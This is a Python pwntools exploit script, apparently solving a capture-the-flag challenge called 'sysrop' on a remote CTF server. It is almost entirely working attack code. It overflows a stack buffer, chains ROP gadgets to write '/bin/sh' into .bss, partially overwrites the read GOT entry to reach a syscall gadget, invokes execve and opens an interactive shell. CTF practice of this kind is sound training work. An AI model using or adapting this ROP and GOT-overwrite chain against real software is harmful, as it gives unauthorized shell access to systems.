# wget https://ctf.j0n9hyun.xyz/files/4f0beb3e1b7605e20f71deb33781b085/sysrop.zip
import time
import sys
from pwn import *

context.arch='amd64'

p = remote("ctf.j0n9hyun.xyz", 3024)
#p = process("./sysrop")
e = ELF('./sysrop')
bss_18 = e.get_section_by_name('.bss').header.sh_addr+0x18

input('attach gdb')

max_size = 0x78
buff_size = 0x18	# include rbp
exec_num = 0x3b
main = 0x004005f2	# main

poprax = 0x4005ea	# rax, rdx, rdi, rsi
poprdx = 0x4005eb	# rdx, rdi, rsi

payload = b'a'*buff_size
payload += p64(poprdx)
payload += p64(0x9)
payload += p64(0x0)
payload += p64(bss_18)	
payload += p64(e.plt['read'])	# call read(0, bss+18, 8)
payload += p64(main)

print('payload1 length: {0} (max: {1}) '.format(len(payload), max_size))
p.sendline(payload)
time.sleep(0.2)
p.sendline(b'/bin/sh\x00')
time.sleep(0.2)

payload = b'b'*(buff_size)
payload += p64(poprdx)
payload += p64(0x1)
payload += p64(0x0)
payload += p64(e.got['read'])
payload += p64(e.plt['read'])	# call read(0, read@got, 1)
payload += p64(poprax)
payload += p64(exec_num)
payload += p64(0x0)
payload += p64(bss_18)
payload += p64(0x0)
payload += p64(e.plt['read'])	# call read('/bin/sh\x00')

print('payload2 length: {0} (max: {1})'.format(len(payload), max_size))

p.sendline(payload)
time.sleep(0.5)
#p.sendline(b'\x7a')	# for local
p.sendline(b'\x5e')	# for remote
time.sleep(0.5)
p.interactive()
